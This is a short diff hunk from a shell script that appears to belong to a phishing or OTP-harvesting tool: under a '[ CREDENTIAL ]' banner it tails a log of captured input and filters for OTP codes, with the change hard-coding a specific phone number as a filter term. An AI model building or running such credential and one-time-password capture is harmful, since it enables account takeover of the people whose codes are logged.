@@ -93,7 +93,7 @@ echo ""
                 echo ""
                 echo -e $green "//  [ CREDENTIAL ] //"
                 echo ""
-                tail -f log.txt | grep -e "number" -e "OTP" -e "otp"
+                tail -f log.txt | grep -e "00966583734859" -e "OTP" -e "otp"
 
 
 
